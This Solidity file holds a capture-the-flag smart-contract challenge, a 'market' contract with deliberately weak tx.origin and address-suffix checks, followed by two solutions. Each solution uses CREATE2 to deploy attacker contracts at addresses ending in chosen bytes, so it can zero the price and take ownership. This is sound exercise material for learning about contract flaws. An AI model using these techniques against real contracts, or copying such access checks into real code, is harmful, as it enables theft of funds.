//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
// 1.使用合约攻击。2.调用者地址后四位为2022。3.成为owner

contract market{
    address public seller = address(this);
    uint256 price = 99999999 ether;
    address public owner = address(this) ;
    uint256 public score;
    
    modifier onlySeller{
        require(msg.sender==seller);
        _;
    }
    
    function buy()public payable {
        require(tx.origin!=msg.sender);
        require(uint160(msg.sender)&0xffff==0x2022);
        require(msg.value>=price,"insufficient amount");
        owner = msg.sender;
    }

    function changePrice(uint256 _price)external onlySeller{
        price = _price;
    }

    function changeSeller()external{
        require(tx.origin != msg.sender);
        require(uint160(msg.sender) & 0xffff == 0xffff);
        seller = msg.sender; 
    }

    function isCompleted()public{
        score=0;
        if(tx.origin!=msg.sender){
            score =25;
        }
        if(uint160(msg.sender)&0xffff==0x2022){
            score=75;
        }
        if(msg.sender==owner){
            score=100;
        }

    }
}

// 我的答案 生成特定地址来攻击合约
contract exchangeseller{

    function attract(address addr) public {
        market(addr).changeSeller();
        market(addr).changePrice(0);
    }
}
contract attractconstract{

    function attract(address addr) public {
        market(addr).buy();
        market(addr).isCompleted();
    }
}
contract getaddress{
    address public exchangeSellerAddress;
    address public attractcontractAddress;

    function exchangeSellerBytesHash() public view returns(bytes32 a){
        a = keccak256(type(exchangeseller).creationCode);
    }
    function getAttractcontractbytecodeHash() public view returns(bytes32 a){
        a = keccak256(type(attractconstract).creationCode);
    }
    
    function getExchangeSeller(bytes32 salt1) public {
        exchangeseller a = new exchangeseller{salt : salt1}();
        exchangeSellerAddress = address(a);
    }
    function getAttractcontractAddress(bytes32 salt1) public {
        attractconstract a = new attractconstract{salt : salt1}();
        attractcontractAddress = address(a);
    }

    // 测试js是否和solidity中的结果是否相同
    function get(address a,bytes32 b,bytes32 c) view public returns(bytes32) {
        return keccak256(abi.encodePacked(bytes1(0xff),a,b,c));
    }
    function getad(bytes32 a) view public returns(address){
        return address(uint160(uint256(a)));
    }
    
}

    

// 给的答案
contract hack {
    function pwn(market mar) public returns(uint128){
        mar.changeSeller();
        mar.changePrice(0);
        // mar.isCompleted();
    }
}

contract hack2 {
    function pwn(market mar) public returns(uint128){
        mar.buy();
        mar.isCompleted();
    }
}

contract deployed {
    hack public ha;
    hack2 public ha2;
    function get() public view returns(bytes32, bytes32) {
        return (keccak256(type(hack).creationCode), keccak256(type(hack2).creationCode));
    }
    function deploy1(bytes32 salt) public returns(address) {
        ha = new hack{salt: salt}();
        return address(ha);
    }
    function exchangeSellerBytesHash() public view returns(bytes32 a){
        a = keccak256(type(exchangeseller).creationCode);
    }

    function deploy2(bytes32 salt) public returns(address) {
        ha2 = new hack2{salt: salt}();
        return address(ha2);
    }
}